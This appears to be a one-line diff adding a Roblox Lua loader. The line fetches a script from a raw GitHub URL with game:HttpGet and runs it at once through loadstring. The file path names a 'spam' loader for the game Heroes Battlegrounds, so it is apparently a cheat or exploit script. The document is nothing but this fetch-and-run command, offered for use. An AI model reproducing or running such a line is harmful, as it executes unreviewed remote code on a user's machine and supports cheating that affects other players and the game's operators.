@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/heroes-battlegrounds-spam3-gt13qm2vo0o4ny.lua"))()
